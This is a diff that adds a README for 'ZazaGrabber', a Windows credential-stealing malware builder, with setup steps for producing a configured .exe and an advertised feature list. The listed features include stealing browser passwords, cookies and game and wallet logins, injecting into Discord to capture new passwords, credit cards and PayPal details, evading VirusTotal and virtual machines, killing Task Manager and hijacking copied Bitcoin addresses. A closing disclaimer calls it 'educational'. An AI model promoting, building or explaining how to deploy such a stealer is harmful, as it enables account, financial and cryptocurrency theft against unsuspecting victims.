@@ -1,3 +1,77 @@
+# ZazaGrabber
+Script to add zaza grabber
+
+## ***Requirements***
+
+- Python 3
+- Python `pip`
+- Python module `httpx`
+- Python module `pyotp`
+- Python module `psutil`
+- Python module `pypiwin32`
+- Python module `pycryptodome`
+- Python module `pyinstaller>=5.0`
+- Python module `PIL-tools`
+- Python module `asyncio`
+- Python module `threaded`
+- Python module `requests`
+- Python module `datetime`
+- Python module `pywin32`
+- Python module `colorama`
+- Python module `pyinstaller`
+- Python module `pillow`
+- Python module `alive-progress`
+- Python module `winregistry`
+- Windows OS (7+)
+
+## <a id="setup"></a> 📁 〢 Setting up ZazaGrab
+
+1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
+2. Install [ZazaGrab Files]([https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip](https://github.com/xKrustyDemonx/zaza-grabber/archive/refs/heads/main.zip))
+3. Install all requirements [install.bat]([https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat](https://github.com/xKrustyDemonx/zaza-grabber/blob/main/install.bat))
+4. Click on start.bat [start.bat]([https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat](https://github.com/xKrustyDemonx/zaza-grabber/blob/main/start.bat))
+5. Complete the configuration
+6. You have your .exe file enjoy :)
+
+
+
+
+## <a id="features"></a>🔰 〢 Features
+
+# 💎 = Premium Features
+
+```diff
+> Default:
+- Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
+- Steal Chrome Passwords / Cookies / History
+- Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
+- Debug Killer (Kill task gestionary)
+- Bypass TokenProtector / BetterDiscord
+- Take a Screenshot
+- Grabb System Informations
+- Bypass Virus Total machines
+- Bypass VM machines
+- Hide Itself in Background
+- Replace the BTC address copying by your
+- Custom Installer / Setuper
+- Icon / Name / Description Customizable
+- Cookies Exploiter Tech (💎)
+- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others
+- 0/64 Detect Virus Total Builder (.exe) (💎)
+- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (💎)
+> Injection:
+- Nitro Auto Buy
+- First Start Reporter
+- New Passwords
+- New Emails
+- New Login
+- New Credit Card
+- New PayPal
+- Anti Delete system (re install after Discord uninstall / Discord Update)
+> + More!
+```
+
+
 <h3 align="center">I am not responisble for any actions that you may or may not take. This is built for educational purposes only. I did this for MY free will and I do not want to take responsibility for other peoples actions.
 
 
